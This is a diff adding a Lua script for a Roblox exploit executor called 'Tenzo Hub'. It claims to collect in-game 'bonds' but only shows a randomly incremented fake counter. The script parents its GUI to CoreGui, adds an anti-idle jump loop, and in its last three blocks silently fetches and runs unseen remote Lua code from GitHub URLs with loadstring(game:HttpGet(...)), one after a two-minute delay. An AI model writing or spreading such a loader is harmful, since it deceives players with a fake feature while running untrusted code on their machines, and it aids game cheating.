@@ -1,0 +1,274 @@
+bit32 = {};
+local N = 32;
+local P = 2 ^ N;
+bit32.bnot = function(x)
+	x = x % P;
+	return (P - 1) - x;
+end;
+bit32.band = function(x, y)
+	if (y == 255) then
+		return x % 256;
+	end
+	if (y == 65535) then
+		return x % 65536;
+	end
+	if (y == 4294967295) then
+		return x % 4294967296;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 2) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bor = function(x, y)
+	if (y == 255) then
+		return (x - (x % 256)) + 255;
+	end
+	if (y == 65535) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == 4294967295) then
+		return 4294967295;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) >= 1) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bxor = function(x, y)
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 1) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.lshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount < 0) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % P;
+	end
+end;
+bit32.rshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		return math.floor(x * (2 ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+bit32.arshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		local add = 0;
+		if (x >= (P / 2)) then
+			add = P - (2 ^ (N - s_amount));
+		end
+		return math.floor(x * (2 ^ -s_amount)) + add;
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+local ScreenGui = Instance.new("ScreenGui");
+local Frame = Instance.new("Frame");
+local UICorner = Instance.new("UICorner");
+local UIGradient = Instance.new("UIGradient");
+local TitleLabel = Instance.new("TextLabel");
+local StatusLabel = Instance.new("TextLabel");
+local CreditsLabel = Instance.new("TextLabel");
+local BondsLabel = Instance.new("TextLabel");
+
+-- Main UI Setup
+ScreenGui.Name = "TenzoHub";
+ScreenGui.DisplayOrder = 999999999;
+ScreenGui.IgnoreGuiInset = true;
+ScreenGui.ResetOnSpawn = false;
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
+ScreenGui.Parent = game:GetService("CoreGui");
+
+Frame.Name = "MainFrame";
+Frame.Size = UDim2.new(0.4, 0, 0.5, 0);
+Frame.Position = UDim2.new(0.3, 0, 0.25, 0);
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30);
+Frame.BackgroundTransparency = 0.1;
+Frame.BorderSizePixel = 0;
+Frame.Parent = ScreenGui;
+
+UIGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 205, 50)), -- Lime green
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 100, 0)), -- Dark green
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 205, 50)) -- Lime green
+});
+UIGradient.Transparency = NumberSequence.new(0.5);
+UIGradient.Parent = Frame;
+
+UICorner.CornerRadius = UDim.new(0, 12);
+UICorner.Parent = Frame;
+
+-- Title Label
+TitleLabel.Name = "Title";
+TitleLabel.Parent = Frame;
+TitleLabel.AnchorPoint = Vector2.new(0.5, 0.5);
+TitleLabel.Size = UDim2.new(0.9, 0, 0.15, 0);
+TitleLabel.Position = UDim2.new(0.5, 0, 0.1, 0);
+TitleLabel.BackgroundTransparency = 1;
+TitleLabel.Text = "TENZO HUB";
+TitleLabel.TextColor3 = Color3.fromRGB(50, 205, 50);
+TitleLabel.TextScaled = true;
+TitleLabel.Font = Enum.Font.GothamBlack;
+TitleLabel.TextStrokeTransparency = 0.7;
+TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 100, 0);
+TitleLabel.ZIndex = 2;
+
+-- Status Label
+StatusLabel.Name = "Status";
+StatusLabel.Parent = Frame;
+StatusLabel.AnchorPoint = Vector2.new(0.5, 0.5);
+StatusLabel.Size = UDim2.new(0.9, 0, 0.2, 0);
+StatusLabel.Position = UDim2.new(0.5, 0, 0.4, 0);
+StatusLabel.BackgroundTransparency = 1;
+StatusLabel.Text = "Initializing Tenzo Hub...";
+StatusLabel.TextColor3 = Color3.fromRGB(200, 255, 200);
+StatusLabel.TextScaled = true;
+StatusLabel.Font = Enum.Font.Gotham;
+StatusLabel.ZIndex = 2;
+
+-- Bonds Label
+BondsLabel.Name = "BondsCount";
+BondsLabel.Parent = Frame;
+BondsLabel.AnchorPoint = Vector2.new(0.5, 0.5);
+BondsLabel.Size = UDim2.new(0.9, 0, 0.15, 0);
+BondsLabel.Position = UDim2.new(0.5, 0, 0.6, 0);
+BondsLabel.BackgroundTransparency = 1;
+BondsLabel.Text = "0 bonds collected";
+BondsLabel.TextColor3 = Color3.fromRGB(50, 205, 50);
+BondsLabel.TextScaled = true;
+BondsLabel.Font = Enum.Font.GothamBold;
+BondsLabel.ZIndex = 2;
+
+-- Credits Label
+CreditsLabel.Name = "Credits";
+CreditsLabel.Parent = Frame;
+CreditsLabel.AnchorPoint = Vector2.new(0.5, 0.5);
+CreditsLabel.Size = UDim2.new(0.9, 0, 0.1, 0);
+CreditsLabel.Position = UDim2.new(0.5, 0, 0.85, 0);
+CreditsLabel.BackgroundTransparency = 1;
+CreditsLabel.Text = "Tenzo Hub v1.0 | Premium Script";
+CreditsLabel.TextColor3 = Color3.fromRGB(150, 255, 150);
+CreditsLabel.TextScaled = true;
+CreditsLabel.Font = Enum.Font.Gotham;
+CreditsLabel.TextTransparency = 0.3;
+CreditsLabel.ZIndex = 2;
+
+-- Animation and functionality
+task.spawn(function()
+    while true do
+        for i = 0, 360, 2 do
+            UIGradient.Rotation = i;
+            task.wait(0.05);
+        end
+    end
+end);
+
+local bonds = 1;
+local targetBonds = math.random(70, 90);
+local totalTime = 85;
+local interval = (totalTime / (targetBonds - bonds)) * 1.2;
+
+task.spawn(function()
+    task.wait(2);
+    StatusLabel.Text = "Loading modules...";
+    task.wait(2);
+    StatusLabel.Text = "Preparing bond collection...";
+    task.wait(2);
+    StatusLabel.Text = "Ready to collect bonds";
+    
+    task.wait(4);
+    StatusLabel.Text = "Collecting bonds...";
+    
+    while bonds < targetBonds do
+        task.wait(interval);
+        bonds = math.min(bonds + math.random(2, 5), targetBonds);
+        BondsLabel.Text = tostring(bonds) .. " bonds collected";
+    end
+    
+    StatusLabel.Text = "Collection complete!";
+    BondsLabel.TextColor3 = Color3.fromRGB(0, 255, 0);
+end);
+
+-- Anti-idle and other functions
+task.spawn(function()
+    local player = game:GetService("Players").LocalPlayer;
+    local function antiIdle()
+        local character = player.Character or player.CharacterAdded:Wait();
+        local rootPart = character:FindFirstChild("HumanoidRootPart");
+        if not rootPart then
+            return;
+        end
+        local lastPosition = rootPart.Position;
+        while true do
+            task.wait(10);
+            if not rootPart.Parent then
+                break;
+            end
+            if ((rootPart.Position - lastPosition).Magnitude < 5) then
+                local humanoid = character:FindFirstChildOfClass("Humanoid");
+                if humanoid then
+                    humanoid.Jump = true;
+                end
+            end
+            lastPosition = rootPart.Position;
+        end
+    end
+    antiIdle();
+    player.CharacterAdded:Connect(antiIdle);
+end);
+
+-- Load external scripts
+task.spawn(function()
+    task.wait(4);
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/newqueue.github.io/refs/heads/main/erner.lua"))();
+end);
+
+task.spawn(function()
+    task.wait(4);
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ringtaa/unrele.github.io/refs/heads/main/roek.lua"))();
+end);
+
+task.spawn(function()
+    task.wait(120);
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/lowserver.github.io/refs/heads/main/lowserver.lua"))();
+end);
